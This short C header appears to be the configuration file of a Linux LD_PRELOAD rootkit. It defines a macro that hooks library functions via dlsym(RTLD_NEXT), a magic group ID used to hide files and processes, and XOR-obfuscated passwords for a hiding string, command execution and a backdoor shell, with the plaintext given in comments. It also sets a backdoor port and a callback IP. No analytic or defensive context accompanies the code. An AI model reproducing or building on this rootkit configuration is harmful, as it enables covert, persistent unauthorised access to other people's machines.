#define DEBUG
#ifndef RTLD_NEXT
#define RTLD_NEXT ((void *) -11) //justincase :)
#endif
#define HOOK(func) old##_##func = dlsym(RTLD_NEXT, #func)
#define CLEAN(var) clean(var, strlen(var))
#define MAGIC "\x43\x47\x4d\x4b\x53" //imgay 
#define MAGICGID 1337
#define EXECPW "\x43\x44\x59\x5e\x4b\x46\x46\x4d\x4f\x44\x5e\x45\x45" //installgentoo
#define SHELLPW "\x48\x46\x1b\x44\x4d" //bl1ng
#define DEFAULT_PORT	61040
#define IP		"1.3.3.7"

